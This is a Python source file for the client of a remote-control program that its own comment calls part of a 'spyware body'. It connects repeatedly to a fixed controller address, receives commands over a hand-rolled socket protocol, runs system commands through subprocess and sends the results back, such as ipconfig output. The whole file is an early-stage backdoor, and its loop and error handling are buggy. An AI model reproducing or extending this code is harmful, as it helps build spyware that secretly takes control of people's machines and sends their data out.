import socket
import time
import os
import subprocess
#establishing standards:
#b'_' acknowledgement
#b'&end' signifys finnishing a transmition
class terminal:
    def __init__(self) -> None:
        pass
    def run_command(self,command):
        command = command.split(" ")
        result = subprocess.run(command, stdout=subprocess.PIPE).stdout.decode()
        return result
class remote_connection: #hopefully this class should provide neatly packaged functions to be shipped to the actual main spyware body
    def __init__(self) -> None:
        self.server = socket.socket()
        self.connect()
    def connect(self):
        while True:
            try:
                self.server.connect(("192.168.1.141",8017))
                break
            except:
                print("connection not available, failed to connect")
        self.handshake(["connected"])
    def shutdown_socket(self):
        self.server.shutdown(socket.SHUT_RDWR)
        self.server.close()
    def handshake(self,buffer):
        try:
            receive_buffer = []
            self.server.recv(1024)
            self.server.sendall(b"_")
            while True:
                recv = self.server.recv(1024)
                if recv == b"&end":
                    break
                self.server.sendall(b"_")
                receive_buffer.append(recv.decode())
            self.server.sendall(b"_")
            self.server.recv(1024)
            send_buffer = str(buffer)
            for i in send_buffer:
                self.server.sendall(i.encode())
                self.server.recv(1024)
            self.server.sendall(b"&end")
            return receive_buffer
        except Exception as problem:
            print(problem)
            self.shutdown_socket()
            self.__init__()
socket_handler = remote_connection()
terminal = terminal()
incoming_buffer = []
outgoing_buffer = []
while True:
    try:
        new_incoming_buffer = socket_handler.handshake(outgoing_buffer)
        for i in new_incoming_buffer:
            incoming_buffer.append(i)
        print("buffer:",incoming_buffer)
        counter = 0
        for i in incoming_buffer:
            del(incoming_buffer)[counter]
            match i:
                case "shutdown":
                    print("shutting down")
                case "ip address":
                    print("getting ip address")
                    for i in terminal.run_command("ipconfig").split("\n"):
                        print("sending",i)
                        outgoing_buffer.append(i)
            counter += 1        
    except Exception as problem:
        print(problem)